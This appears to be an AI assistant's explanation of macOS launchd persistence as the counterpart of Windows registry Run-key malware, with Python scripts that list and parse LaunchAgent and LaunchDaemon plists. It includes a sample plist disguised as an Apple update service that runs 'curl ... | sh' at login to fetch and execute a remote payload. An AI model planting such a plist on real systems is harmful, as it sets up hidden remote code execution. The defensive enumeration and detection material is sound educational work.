# 17-01072026
Below is the **macOS analogue of “Persistence and Registry-Resident Malware”**, explained clearly and demonstrated **with Python (and `ctypes` where appropriate)**, again **strictly for defensive / reverse-engineering literacy**.

> ⚠️ **Framing**
>
> - macOS has **no registry**.
> - The *idea* absolutely exists.
> - On macOS, persistence is achieved by **hiding execution instructions inside trusted OS configuration stores**, not files on disk.
>
> Think:
> **“Registry keys” → “plist-based system metadata.”**

---

## Strip the Windows terms → the real persistence idea

### Windows registry persistence (core idea)
> *Store execution instructions in a system-trusted configuration database that is automatically read at login or boot.*

### macOS equivalent (core idea)
> *Store execution instructions in system-trusted **property lists (plists)** that are automatically executed by launchd.*

Same goal.  
Same stealth.  
Different storage.

---

## macOS equivalents of Windows Run / RunOnce

| Windows Registry Key | macOS Equivalent |
|--------------------|------------------|
| `HKCU\...\Run` | `~/Library/LaunchAgents/*.plist` |
| `HKLM\...\Run` | `/Library/LaunchAgents/*.plist` |
| System startup | `/Library/LaunchDaemons/*.plist` |
| One-time run | `LaunchAgent` with `RunAtLoad` |
| Fileless payload | `ProgramArguments` (inline commands) |

On macOS, **launchd is the registry**.

---

## Why this is stealthy on macOS

- launchd plists are:
  - everywhere
  - expected
  - rarely reviewed manually
- defenders often scan:
  - binaries
  - apps
  - scripts  
  **not configuration metadata**
- commands can be:
  - inline
  - fileless
  - interpreter-based (bash, python, sh)

Exactly the same trust failure as the Windows registry.

---

# macOS ANALOGUE: LAUNCHD-RESIDENT PERSISTENCE

Below are **read-only / defensive demonstrations** showing how this persistence works mechanically.

---

## 1️⃣ LaunchAgents (user-level persistence)

**Closest equivalent to `HKCU\...\Run`**

These run **when the user logs in**.

### Location
```
~/Library/LaunchAgents/
```

---

### Example: What a suspicious LaunchAgent looks like

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
 "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.updatesvc</string>

    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>-c</string>
        <string>curl -fsSL https://example.com/payload | sh</string>
    </array>

    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
```

✔ No malware binary  
✔ Inline command  
✔ Auto-executes at login  
✔ Looks legitimate  

This is **registry-resident malware**, macOS edition.

---

## 2️⃣ LaunchDaemons (system-level persistence)

**Closest equivalent to `HKLM\...\Run`**

These run:
- at boot
- as root
- before user login

### Location
```
/Library/LaunchDaemons/
```

These are **high-impact** persistence mechanisms.

---

## 3️⃣ Fileless persistence on macOS

Windows malware:
```powershell
reg add Run /v payload /d "powershell -enc ..."
```

macOS malware:
```plist
ProgramArguments = ["bash", "-c", "<inline command>"]
```

No file required.  
No executable dropped.  
Persistence lives in metadata.

---

# DEFENSIVE DEMONSTRATIONS (Python)

## Enumerate LaunchAgents & LaunchDaemons (read-only)

This is what **EDRs and IR scripts actually do**.

```python
import os
from pathlib import Path

paths = [
    Path.home() / "Library/LaunchAgents",
    Path("/Library/LaunchAgents"),
    Path("/Library/LaunchDaemons")
]

for p in paths:
    if not p.exists():
        continue

    print(f"\n[+] Scanning {p}")
    for plist in p.glob("*.plist"):
        print("  ", plist)
```

---

## Parse suspicious persistence entries

```python
import plistlib

def inspect_plist(path):
    with open(path, "rb") as f:
        pl = plistlib.load(f)

    return {
        "Label": pl.get("Label"),
        "Program": pl.get("Program"),
        "ProgramArguments": pl.get("ProgramArguments"),
        "RunAtLoad": pl.get("RunAtLoad"),
        "KeepAlive": pl.get("KeepAlive"),
    }

for p in paths:
    if not p.exists():
        continue

    for plist in p.glob("*.plist"):
        info = inspect_plist(plist)
        if info["ProgramArguments"]:
            print(f"\n[!] {plist}")
            for k, v in info.items():
                print(f"    {k}: {v}")
```

**Red flags analysts look for:**
- `bash -c`
- `curl | sh`
- `python -c`
- encoded blobs
- misleading labels (`com.apple.*`)

---

## Why ctypes is usually unnecessary here

Unlike:
- hooking
- injection
- memory tampering

Persistence via launchd is **configuration-level**, not syscall-level.

Attackers don’t need:
- `ctypes`
- memory writes
- API abuse

They rely on:
> **launchd doing exactly what it’s designed to do**

That’s why this technique is so reliable.

---

## How this maps exactly to Windows registry malware

| Windows | macOS |
|------|------|
| Registry value | plist key |
| Run / RunOnce | LaunchAgent |
| Fileless PowerShell | Inline shell |
| Trusted OS mechanism | Trusted OS mechanism |
| Rarely audited | Rarely audited |

Same trust mistake.  
Different storage.

---

## Detection & mitigation (defensive view)

### What defenders monitor
- New or modified plist files
- Inline shell execution
- Mismatched labels vs behavior
- launchd jobs spawning interpreters
- Persistence created shortly after user interaction

### How macOS mitigates
- TCC & SIP (limited)
- User approval prompts (sometimes)
- EDR file-integrity monitoring
- LaunchServices telemetry

But **misconfigured systems remain vulnerable**.

---

## Key insight

> **Registry-resident malware isn’t about registries.**
>
> It’s about **living inside OS-trusted configuration stores**.

Windows uses the registry.  
macOS uses launchd plists.  
Linux uses systemd units / cron.

Same persistence class everywhere.

---

## If you want next

I can:
- compare **LaunchAgents vs cron vs login items**
- show **fileless persistence detection heuristics**
- map this to **MITRE ATT&CK persistence techniques**
- explain **how malware hides among legitimate plists**
- walk through **IR playbooks for persistence cleanup**

Just say the word.